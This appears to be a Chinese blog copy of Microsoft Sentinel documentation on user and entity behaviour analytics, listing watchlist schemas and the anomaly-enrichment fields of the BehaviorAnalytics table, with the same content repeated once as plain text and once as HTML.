+DMZ
+可选
+
+
+标记
+列出
+[“Example”,”Example”]
+可选
+
+
+离职的员工“离职的员工”监视列表列出已离职或即将离职的员工的用户帐户，此监视列表包括以下字段：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+用户标识符
+UID
+52322ec8-6ebf-11eb-9439-0242ac130002
+可选
+
+
+用户 AAD 对象 ID
+SID
+03fa4b4e-dc26-426f-87b7-98e0c9e2955e
+可选
+
+
+用户本地 SID
+SID
+S-1-12-1-4141952679-1282074057-123
+可选
+
+
+用户主体名称
+UPN
+&#x4a;&#101;&#x66;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#105;&#x6e;&#106;&#97;
+必需
+
+
+UserState
+字符串
+
+
+
+
+建议使用 Notified 或 Terminated
+Terminated
+必需
+
+
+
+通知日期
+时间戳 - 具体日期
+01.12.20
+可选
+
+
+终止日期
+时间戳 - 具体日期
+01.01.21
+必需
+
+
+标记
+列出
+[“SAW user”,”Amba Wolfs team”]
+可选
+
+
+标识相关“标识相关”监视列表列出属于同一人员的相关用户帐户，此监视列表包括以下字段：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+用户标识符
+UID
+52322ec8-6ebf-11eb-9439-0242ac130002
+可选
+
+
+用户 AAD 对象 ID
+SID
+03fa4b4e-dc26-426f-87b7-98e0c9e2955e
+可选
+
+
+用户本地 SID
+SID
+S-1-12-1-4141952679-1282074057-627758481-2916039507
+可选
+
+
+用户主体名称
+UPN
+&#x4a;&#x65;&#x66;&#x66;&#x4c;&#64;&#x73;&#101;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#105;&#110;&#x6a;&#x61;
+必需
+
+
+员工 ID
+字符串
+8234123
+可选
+
+
+Email
+电子邮件
+&#x4a;&#101;&#102;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#x61;
+可选
+
+
+关联的特权帐户 ID
+UID/SID
+S-1-12-1-4141952679-1282074057-627758481-2916039507
+可选
+
+
+关联的特权帐户
+UPN
+&#65;&#100;&#x6d;&#x69;&#x6e;&#64;&#x73;&#101;&#99;&#x63;&#120;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#97;
+可选
+
+
+标记
+列出
+[“SAW user”,”Amba Wolfs team”]
+可选
+
+
+服务帐户“服务帐户”监视列表列出服务帐户及其所有者，此监视列表包括以下字段：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+服务标识符
+UID
+1111-112123-12312312-123123123
+可选
+
+
+服务 AAD 对象 ID
+SID
+11123-123123-123123-123123
+可选
+
+
+服务本地 SID
+SID
+S-1-12-1-3123123-123213123-12312312-2916039507
+可选
+
+
+服务主体名称
+UPN
+&#x6d;&#121;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;&#112;&#114;&#105;&#110;&#64;&#x63;&#111;&#110;&#x74;&#111;&#x73;&#111;&#x2e;&#99;&#x6f;&#x6d;
+必需
+
+
+所有者用户标识符
+UID
+52322ec8-6ebf-11eb-9439-0242ac130002
+可选
+
+
+所有者用户 AAD 对象 ID
+SID
+03fa4b4e-dc26-426f-87b7-98e0c9e2955e
+可选
+
+
+所有者用户本地 SID
+SID
+S-1-12-1-4141952679-1282074057-627758481-2916039507
+可选
+
+
+所有者用户主体名称
+UPN
+&#74;&#101;&#x66;&#x66;&#x4c;&#64;&#115;&#x65;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#x69;&#110;&#106;&#x61;
+必需
+
+
+标记
+列出
+[“Automation Account”,”GitHub Account”]
+可选
+
+
+https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments
+BehaviorAnalytics 表下表说明了 Microsoft Sentinel 中每个实体详细信息页上显示的行为分析数据。
+
+
+
+字段
+类型
+说明
+
+
+
+TenantId
+string
+租户的唯一 ID 编号。
+
+
+SourceRecordId
+字符串
+EBA 事件的唯一 ID 编号。
+
+
+TimeGenerated
+datetime
+活动发生时的时间戳。
+
+
+TimeProcessed
+datetime
+EBA 引擎处理活动时的时间戳。
+
+
+ActivityType
+字符串
+活动的高级类别。
+
+
+ActionType
+字符串
+活动的规范化名称。
+
+
+UserName
+字符串
+发起活动的用户的用户名。
+
+
+UserPrincipalName
+字符串
+发起活动的用户的完整用户名。
+
+
+EventSource
+字符串
+提供原始事件的数据源。
+
+
+SourceIPAddress
+字符串
+发起活动的 IP 地址。
+
+
+SourceIPLocation
+字符串
+发起活动的国家/地区，从 IP 地址进行扩充。
+
+
+SourceDevice
+字符串
+发起活动的设备的主机名。
+
+
+DestinationIPAddress
+字符串
+活动目标的 IP 地址。
+
+
+DestinationIPLocation
+字符串
+活动目标所在国家/地区，从 IP 地址进行扩充。
+
+
+DestinationDevice
+字符串
+目标设备的名称。
+
+
+UsersInsights
+动态
+相关用户的上下文扩充（详细信息如下）。
+
+
+DevicesInsights
+动态
+相关设备的上下文扩充（详细信息如下）。
+
+
+ActivityInsights
+动态
+基于我们的分析的活动的上下文分析（详细信息如下）。
+
+
+InvestigationPriority
+int
+异常分数，介于 0-10（0=良性，10=高度异常）。
+
+
+实体扩充动态字段
+UsersInsights 字段下表说明了 BehaviorAnalytics 表中 UsersInsights 动态字段中提供的扩充：
+
+
+
+扩充名称
+说明
+示例值
+
+
+
+帐户显示名称
+
+
+
+
+(AccountDisplayName)
+用户的帐户显示名称。
+Admin、Hayden Cook
+
+
+帐户域
+
+
+
+
+(AccountDomain)
+用户的帐户域名。
+帐户对象 ID
+
+
+(AccountObjectID)
+用户的帐户对象 ID。
+a58df659-5cab-446c-9dd0-5a3af20ce1c2
+
+
+冲击半径
+
+
+
+
+(BlastRadius)
+冲击半径根据多个因素来计算：用户在组织树中的位置，以及用户的 Azure Active Directory 角色和权限。
+低、中、高
+
+
+休眠帐户
+
+
+
+
+(IsDormantAccount)
+此帐户在过去 180 天内未使用。
+True、False
+
+
+本地管理员
+
+
+
+
+(IsLocalAdmin)
+此帐户具有本地管理员权限。
+True、False
+
+
+新帐户
+
+
+
+
+(IsNewAccount)
+此帐户是在过去 30 天内创建的。
+True、False
+
+
+本地 SID
+
+
+
+
+(OnPremisesSID)
+与该操作相关的用户的本地 SID。
+S-1-5-21-1112946627-1321165628-2437342228-1103
+
+
+
+
+
+
+
+DevicesInsights 字段下表说明了 BehaviorAnalytics 表中 DevicesInsights 动态字段中提供的扩充：
+
+
+
+扩充名称
+说明
+示例值
+
+
+
+浏览器
+
+
+
+
+(Browser)
+操作中使用的浏览器。
+Edge、Chrome
+
+
+设备系列
+
+
+
+
+(DeviceFamily)
+操作中使用的设备系列。
+Windows
+
+
+设备类型
+
+
+
+
+(DeviceType)
+操作中使用的客户端设备类型
+桌面
+
+
+ISP
+
+
+
+
+(ISP)
+操作中使用的 Internet 服务提供商。
+
+
+
+操作系统
+
+
+
+
+(OperatingSystem)
+操作中使用的操作系统。
+Windows 10
+
+
+威胁 intel 指标说明
+
+
+
+
+(ThreatIntelIndicatorDescription)
+从操作中使用的 IP 地址解析的观察到的威胁指标的说明。
+主机是僵尸网络的成员：azorult
+
+
+威胁 intel 指标类型
+
+
+
+
+(ThreatIntelIndicatorType)
+从操作中使用的 IP 地址解析的威胁指标的类型。
+僵尸网络、C2、CryptoMining、Darknet、Ddos、MaliciousUrl、恶意软件、仿冒、代理、PUA、播放列表
+
+
+用户代理
+
+
+
+
+(UserAgent)
+操作中使用的用户代理。
+Microsoft Azure Graph Client Library 1.0、
+
+
+Swagger-Codegen/1.4.0.0/csharp,
+
+
+
+
+EvoSTS
+
+
+
+
+用户代理系列
+
+
+
+
+(UserAgentFamily)
+操作中使用的用户代理系列。
+Chrome、Edge、Firefox
+
+
+
+
+
+
+
+ActivityInsights 字段下表说明了 BehaviorAnalytics 表中 ActivityInsights 动态字段中提供的扩充：
+已执行的操作
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次执行的操作
+
+
+
+
+
+(FirstTimeUserPerformedAction)
+180
+用户首次执行此操作。
+True、False
+
+
+用户不常执行的操作
+
+
+
+
+
+(ActionUncommonlyPerformedByUser)
+10
+用户不常执行此操作。
+True、False
+
+
+对等机之间不常执行的操作
+
+
+
+
+
+(ActionUncommonlyPerformedAmongPeers)
+180
+用户的对等机之间不常执行此操作。
+True、False
+
+
+首次在租户中执行的操作
+
+
+
+
+
+(FirstTimeActionPerformedInTenant)
+180
+此操作由组织中的任何人首次执行。
+True、False
+
+
+租户中不常执行的操作
+
+
+
+
+
+(ActionUncommonlyPerformedInTenant)
+180
+组织中不常执行此操作。
+True、False
+
+
+
+
+
+
+
+
+使用的应用
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次使用的应用
+
+
+
+
+
+(FirstTimeUserUsedApp)
+180
+用户首次使用此应用。
+True、False
+
+
+用户不常使用的应用
+
+
+
+
+
+(AppUncommonlyUsedByUser)
+10
+用户不常使用此应用。
+True、False
+
+
+在对等机之间不常使用的应用
+
+
+
+
+
+(AppUncommonlyUsedAmongPeers)
+180
+在用户的对等机之间不常使用此应用。
+True、False
+
+
+首次在租户中观察到的应用
+
+
+
+
+
+(FirstTimeAppObservedInTenant)
+180
+在组织中首次观察到此应用。
+True、False
+
+
+租户中不常使用的应用
+
+
+
+
+
+(AppUncommonlyUsedInTenant)
+180
+组织中不常使用此应用。
+True、False
+
+
+
+
+
+
+
+
+使用的浏览器
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次通过浏览器连接
+
+
+
+
+
+(FirstTimeUserConnectedViaBrowser)
+30
+用户首次观察到此浏览器。
+True、False
+
+
+用户不常使用的浏览器
+
+
+
+
+
+(BrowserUncommonlyUsedByUser)
+10
+用户不常使用此浏览器。
+True、False
+
+
+在对等机之间不常使用的浏览器
+
+
+
+
+
+(BrowserUncommonlyUsedAmongPeers)
+30
+在用户的对等机之间不常使用此浏览器。
+True、False
+
+
+首次在租户中观察到的浏览器
+
+
+
+
+
+(FirstTimeBrowserObservedInTenant)
+30
+在组织中首次观察到此浏览器。
+True、False
+
+
+租户中不常使用的浏览器
+
+
+
+
+
+(BrowserUncommonlyUsedInTenant)
+30
+组织中不常使用此浏览器。
+True、False
+
+
+
+
+
+
+
+
+从其连接的国家/地区
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次从国家/地区连接
+
+
+
+
+
+(FirstTimeUserConnectedFromCountry)
+90
+用户首次从 IP 地址解析的这个地理位置连接。
+True、False
+
+
+用户不常从其连接的国家/地区
+
+
+
+
+
+(CountryUncommonlyConnectedFromByUser)
+10
+用户不常从 IP 地址解析的这个地理位置连接。
+True、False
+
+
+在对等机之间不常从其连接的国家/地区
+
+
+
+
+
+(CountryUncommonlyConnectedFromAmongPeers)
+90
+用户的对等机之间不常从 IP 地址解析的这个地理位置连接。
+True、False
+
+
+首次从租户中观察到的国家/地区连接
+
+
+
+
+
+(FirstTimeConnectionFromCountryObservedInTenant)
+90
+组织中的任何人首次从该国家/地区连接。
+True、False
+
+
+租户中不常从其连接的国家/地区
+
+
+
+
+
+(CountryUncommonlyConnectedFromInTenant)
+90
+组织中不常从 IP 地址解析的这个地理位置连接。
+True、False
+
+
+
+
+
+
+
+
+用于连接的设备
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次从设备连接
+
+
+
+
+
+(FirstTimeUserConnectedFromDevice)
+30
+用户首次从该源设备连接。
+True、False
+
+
+用户不常使用的设备
+
+
+
+
+
+(DeviceUncommonlyUsedByUser)
+10
+用户不常使用此设备。
+True、False
+
+
+在对等机之间不常使用的设备
+
+
+
+
+
+(DeviceUncommonlyUsedAmongPeers)
+180
+在用户的对等机之间不常使用此设备。
+True、False
+
+
+首次在租户中观察到的设备
+
+
+
+
+
+(FirstTimeDeviceObservedInTenant)
+30
+此设备首次在组织中观察到。
+True、False
+
+
+租户中不常使用的设备
+
+
+
+
+
+(DeviceUncommonlyUsedInTenant)
+180
+组织中不常使用此设备。
+True、False
+
+
+
+
+
+
+
+
+其他相关设备
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次登录到设备
+
+
+
+
+
+(FirstTimeUserLoggedOnToDevice)
+180
+用户首次连接到此目标设备。
+True、False
+
+
+租户中不常使用的设备系列
+
+
+
+
+
+(DeviceFamilyUncommonlyUsedInTenant)
+30
+组织中不常使用此设备系列。
+True、False
+
+
+
+
+
+
+
+
+用于连接的 Internet 服务提供商
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次通过 ISP 连接
+
+
+
+
+
+(FirstTimeUserConnectedViaISP)
+30
+用户首次观察到此 ISP。
+True、False
+
+
+用户不常使用的 ISP
+
+
+
+
+
+(ISPUncommonlyUsedByUser)
+10
+用户不常使用此 ISP。
+True、False
+
+
+在对等机之间不常使用的 ISP
+
+
+
+
+
+(ISPUncommonlyUsedAmongPeers)
+30
+在用户的对等机之间不常使用此 ISP。
+True、False
+
+
+首次在租户中通过 ISP 连接
+
+
+
+
+
+(FirstTimeConnectionViaISPInTenant)
+30
+在组织中首次观察到此 ISP。
+True、False
+
+
+租户中不常使用的 ISP
+
+
+
+
+
+(ISPUncommonlyUsedInTenant)
+30
+组织中不常使用此 ISP。
+True、False
+
+
+
+
+
+
+
+
+访问的资源
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户首次访问的资源
+
+
+
+
+
+(FirstTimeUserAccessedResource)
+180
+此资源由用户首次访问。
+True、False
+
+
+用户不常访问的资源
+
+
+
+
+
+(ResourceUncommonlyAccessedByUser)
+10
+用户不常访问该资源。
+True、False
+
+
+在对等机之间不常访问的资源
+
+
+
+
+
+(ResourceUncommonlyAccessedAmongPeers)
+180
+在用户的对等机之间不常访问该资源。
+True、False
+
+
+首次在租户中访问的资源
+
+
+
+
+
+(FirstTimeResourceAccessedInTenant)
+180
+此资源由组织中的任何人首次访问。
+True、False
+
+
+租户中不常访问的资源
+
+
+
+
+
+(ResourceUncommonlyAccessedInTenant)
+180
+组织中不常访问此资源。
+True、False
+
+
+
+
+
+
+
+
+杂项
+
+
+
+扩充名称
+基线（天）
+说明
+示例值
+
+
+
+用户上次执行的操作
+
+
+
+
+
+(LastTimeUserPerformedAction)
+180
+上次用户执行了相同的操作。
+
+
+
+过去未执行类似操作
+
+
+
+
+
+(SimilarActionWasn’tPerformedInThePast)
+30
+用户未在相同的资源提供程序中执行任何操作。
+True、False
+
+
+源 IP 位置
+
+
+
+
+
+(SourceIPLocation)
+空值
+此国家/地区从操作的源 IP 解析。
+[英国萨里]
+
+
+不常见的大量操作
+
+
+
+
+
+...
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h3 id="什么是用户和实体行为分析-UEBA-？"><a href="#什么是用户和实体行为分析-UEBA-？" class="headerlink" title="什么是用户和实体行为分析 (UEBA)？"></a>什么是用户和实体行为分析 (UEBA)？</h3><p>识别组织内的威胁及其潜在影响（无论是被入侵的实体还是恶意内部因素）始终是一个耗时耗力的过程。 筛选警报、连接各点和主动搜寻都需要大量的时间和精力，却只有极少回报，而复杂的潜在威胁却很难发现。 特别难以发现的威胁（如零日威胁、针对性威胁和高级持久性威胁）对组织来说是最危险的，因此能够检测这些威胁则变得更加重要。</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"><br>￼</p>
+<h3 id="安全驱动的分析"><a href="#安全驱动的分析" class="headerlink" title="安全驱动的分析"></a>安全驱动的分析</h3><p>受 Gartner 的 UEBA 解决方案范例的启发，Microsoft Sentinel 根据 3 个参考框架提供了一种“由外而内”的方法：</p>
+<ul>
+<li><pre><code>    用例：MITRE ATT&amp;CK 策略、技术和分解技术框架将各种实体作为受害者、作恶者或枢轴点放入杀伤链中，Microsoft Sentinel 根据按照此框架开展的安全性研究对相关攻击途径和方案划分优先级，从而特别专注于每个数据源可以提供的最有价值的日志。
+</code></pre>
+</li>
+<li><pre><code>    数据源：尽管首要支持 Azure 数据源，但出于周全性考虑，Microsoft Sentinel 选择第三方数据源来提供与我们的威胁方案相匹配的数据。
+</code></pre>
+</li>
+<li><pre><code>    分析：Microsoft Sentinel 使用各种机器学习 (ML) 算法来识别异常活动，并以上下文信息丰富的形式清晰、准确地呈现证据，相关示例如下所示。
+</code></pre>
+</li>
+</ul>
+<p>￼<br><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p>Microsoft Sentinel 提供的项目可帮助安全分析师结合上下文并通过对比用户的基线概况来清楚地了解环境中的异常活动。 用户（或主机、地址）执行的操作在上下文中进行评估，“true”结果则表示发现异常：</p>
+<ul>
+<li><pre><code>    跨地理位置、设备和环境。
+</code></pre>
+</li>
+<li><pre><code>    跨时间和频率（与用户自己的历史记录相比）。
+</code></pre>
+</li>
+<li><pre><code>    与对等方的行为进行比较。
+</code></pre>
+</li>
+<li><pre><code>    与组织的行为进行比较。
+</code></pre>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"><br>￼<br><img lazyload src="/images/loading.svg" data-src="7.png"><br>￼</p>
+<h4 id="计分"><a href="#计分" class="headerlink" title="计分"></a>计分</h4><p>每个活动都使用“调查优先级评分”进行评分，该评分根据对用户及其对等方的行为学习来确定特定用户执行特定活动的概率。 被识别为最不正常的活动会获得最高分（分数范围为 0-10 分）。</p>
+<h4 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h4><p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<h3 id="规则模版"><a href="#规则模版" class="headerlink" title="规则模版"></a>规则模版</h3><p><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/watchlist-schemas">https://docs.microsoft.com/zh-cn/azure/sentinel/watchlist-schemas<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>高价值资产</strong><br>“高价值资产”监视列表列出组织中具有重要价值的设备、资源和其他资产，此监视列表包括以下字段：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>资产类型</strong></td>
+<td>字符串</td>
+<td>Device, Azure resource, AWS resource, URL, SPO, File share, Other</td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>资产 ID</strong></td>
+<td>字符串，视资产类型而定</td>
+<td>/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourceGroups/SOC-Purview/providers/Microsoft.Storage/storageAccounts/purviewadls</td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>资产名称</strong></td>
+<td>字符串</td>
+<td>Microsoft.Storage/storageAccounts/purviewadls</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>资产 FQDN</strong></td>
+<td>FQDN</td>
+<td>Finance-SRv.local.microsoft.com</td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>IP 地址</strong></td>
+<td>IP</td>
+<td>1.1.1.1</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“SAW user”,”Blue Ocean team”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><strong>VIP 用户</strong><br>“VIP 用户”监视列表列出组织中影响力较高的员工的用户帐户，此监视列表包括以下值：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户标识符</strong></td>
+<td>UID</td>
+<td>52322ec8-6ebf-11eb-9439-0242ac130002</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户 AAD 对象 ID</strong></td>
+<td>SID</td>
+<td>03fa4b4e-dc26-426f-87b7-98e0c9e2955e</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户本地 SID</strong></td>
+<td>SID</td>
+<td>S-1-12-1-4141952679-1282074057-627758481-2916039507</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户主体名称</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#x4a;&#101;&#102;&#x66;&#x4c;&#64;&#x73;&#101;&#x63;&#99;&#x78;&#x70;&#46;&#110;&#105;&#110;&#x6a;&#97;">&#x4a;&#101;&#102;&#x66;&#x4c;&#64;&#x73;&#101;&#x63;&#99;&#x78;&#x70;&#46;&#110;&#105;&#110;&#x6a;&#97;<i class="fas fa-external-link-alt"></i></a></td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“SAW user”,”Blue Ocean team”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><strong>网络映射</strong><br>“网络映射”监视列表列出 IP 子网及其各自的组织上下文，此监视列表包括以下字段：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>IP 子网</strong></td>
+<td>子网范围</td>
+<td>198.51.100.0/24 - 198……/22</td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>范围名</strong></td>
+<td>字符串</td>
+<td>DMZ</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“Example”,”Example”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><strong>离职的员工</strong><br>“离职的员工”监视列表列出已离职或即将离职的员工的用户帐户，此监视列表包括以下字段：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户标识符</strong></td>
+<td>UID</td>
+<td>52322ec8-6ebf-11eb-9439-0242ac130002</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户 AAD 对象 ID</strong></td>
+<td>SID</td>
+<td>03fa4b4e-dc26-426f-87b7-98e0c9e2955e</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户本地 SID</strong></td>
+<td>SID</td>
+<td>S-1-12-1-4141952679-1282074057-123</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户主体名称</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#x4a;&#101;&#x66;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#105;&#x6e;&#106;&#97;">&#x4a;&#101;&#x66;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#105;&#x6e;&#106;&#97;<i class="fas fa-external-link-alt"></i></a></td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>UserState</strong></td>
+<td>字符串</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>建议使用 Notified 或 Terminated</td>
+<td>Terminated</td>
+<td>必需</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>通知日期</strong></td>
+<td>时间戳 - 具体日期</td>
+<td>01.12.20</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>终止日期</strong></td>
+<td>时间戳 - 具体日期</td>
+<td>01.01.21</td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“SAW user”,”Amba Wolfs team”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><strong>标识相关</strong><br>“标识相关”监视列表列出属于同一人员的相关用户帐户，此监视列表包括以下字段：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户标识符</strong></td>
+<td>UID</td>
+<td>52322ec8-6ebf-11eb-9439-0242ac130002</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户 AAD 对象 ID</strong></td>
+<td>SID</td>
+<td>03fa4b4e-dc26-426f-87b7-98e0c9e2955e</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户本地 SID</strong></td>
+<td>SID</td>
+<td>S-1-12-1-4141952679-1282074057-627758481-2916039507</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>用户主体名称</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#x4a;&#x65;&#x66;&#x66;&#x4c;&#64;&#x73;&#101;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#105;&#110;&#x6a;&#x61;">&#x4a;&#x65;&#x66;&#x66;&#x4c;&#64;&#x73;&#101;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#105;&#110;&#x6a;&#x61;<i class="fas fa-external-link-alt"></i></a></td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>员工 ID</strong></td>
+<td>字符串</td>
+<td>8234123</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>Email</strong></td>
+<td>电子邮件</td>
+<td><a class="link" href="mailto:&#x4a;&#101;&#102;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#x61;">&#x4a;&#101;&#102;&#102;&#x4c;&#64;&#115;&#101;&#99;&#99;&#x78;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#x61;<i class="fas fa-external-link-alt"></i></a></td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>关联的特权帐户 ID</strong></td>
+<td>UID/SID</td>
+<td>S-1-12-1-4141952679-1282074057-627758481-2916039507</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>关联的特权帐户</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#65;&#100;&#x6d;&#x69;&#x6e;&#64;&#x73;&#101;&#99;&#x63;&#120;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#97;">&#65;&#100;&#x6d;&#x69;&#x6e;&#64;&#x73;&#101;&#99;&#x63;&#120;&#112;&#x2e;&#x6e;&#x69;&#x6e;&#x6a;&#97;<i class="fas fa-external-link-alt"></i></a></td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“SAW user”,”Amba Wolfs team”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><strong>服务帐户</strong><br>“服务帐户”监视列表列出服务帐户及其所有者，此监视列表包括以下字段：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段名称</strong></th>
+<th><strong>格式</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>必需/可选</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>服务标识符</strong></td>
+<td>UID</td>
+<td>1111-112123-12312312-123123123</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>服务 AAD 对象 ID</strong></td>
+<td>SID</td>
+<td>11123-123123-123123-123123</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>服务本地 SID</strong></td>
+<td>SID</td>
+<td>S-1-12-1-3123123-123213123-12312312-2916039507</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>服务主体名称</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#x6d;&#121;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;&#112;&#114;&#105;&#110;&#64;&#x63;&#111;&#110;&#x74;&#111;&#x73;&#111;&#x2e;&#99;&#x6f;&#x6d;">&#x6d;&#121;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;&#112;&#114;&#105;&#110;&#64;&#x63;&#111;&#110;&#x74;&#111;&#x73;&#111;&#x2e;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a></td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>所有者用户标识符</strong></td>
+<td>UID</td>
+<td>52322ec8-6ebf-11eb-9439-0242ac130002</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>所有者用户 AAD 对象 ID</strong></td>
+<td>SID</td>
+<td>03fa4b4e-dc26-426f-87b7-98e0c9e2955e</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>所有者用户本地 SID</strong></td>
+<td>SID</td>
+<td>S-1-12-1-4141952679-1282074057-627758481-2916039507</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><strong>所有者用户主体名称</strong></td>
+<td>UPN</td>
+<td><a class="link" href="mailto:&#74;&#101;&#x66;&#x66;&#x4c;&#64;&#115;&#x65;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#x69;&#110;&#106;&#x61;">&#74;&#101;&#x66;&#x66;&#x4c;&#64;&#115;&#x65;&#99;&#x63;&#x78;&#112;&#46;&#x6e;&#x69;&#110;&#106;&#x61;<i class="fas fa-external-link-alt"></i></a></td>
+<td>必需</td>
+</tr>
+<tr>
+<td><strong>标记</strong></td>
+<td>列出</td>
+<td>[“Automation Account”,”GitHub Account”]</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<p><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments">https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments<i class="fas fa-external-link-alt"></i></a></p>
